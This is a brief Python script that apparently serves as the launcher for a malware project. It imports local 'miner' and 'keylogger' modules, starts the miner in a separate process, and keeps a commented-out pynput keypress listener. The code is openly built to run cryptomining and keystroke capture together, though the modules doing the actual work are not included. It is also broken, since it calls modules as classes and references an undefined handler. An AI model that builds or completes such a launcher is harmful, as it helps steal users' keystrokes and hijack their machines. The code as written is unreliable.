import miner
import keylogger
from pynput.keyboard import Listener
from multiprocessing import Process


if __name__ == '__main__':
    m = miner()
    k = keylogger()
    print(k)

    p = Process(target = m.mine)
    p.start()
    p.join()


"""
with Listener(on_press=press) as listener: # Keypress listener
    listener.join()
"""
